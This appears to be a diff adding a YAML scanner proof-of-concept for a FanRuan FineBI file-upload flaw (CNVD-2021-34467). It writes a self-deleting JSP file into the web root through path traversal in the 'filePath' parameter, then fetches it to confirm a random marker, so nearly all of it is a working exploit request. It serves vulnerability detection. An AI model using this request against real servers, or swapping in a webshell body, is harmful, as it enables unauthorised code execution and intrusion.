@@ -1,0 +1,31 @@
+name: yaml-poc-fanruan-finebi-file_upload-CNVD-2021-34467
+binding: 278ff9de-56bd-4e14-ae4f-29c8667f1d2d
+detail:
+    author: system_user
+    links:
+        - https://vul.wangan.com/a/CNVD-2021-34467
+    vulnerability:
+        id: 6f915c4d-fa4e-4f20-badc-4e7903f19313
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    rand: md5(randomLowercase(20))
+    rFilename: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/{{rFilename}}.svg.jsp
+            headers:
+                Content-Type: text/xml;charset=UTF-8
+            body: '{"__CONTENT__":"<%out.println(\"{{rand}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>","__CHARSET__":"UTF-8"}'
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /WebReport/{{rFilename}}.svg.jsp
+        expression: response.status == 200 && response.body.bcontains(bytes(rand))
+expression: r0() && r1()
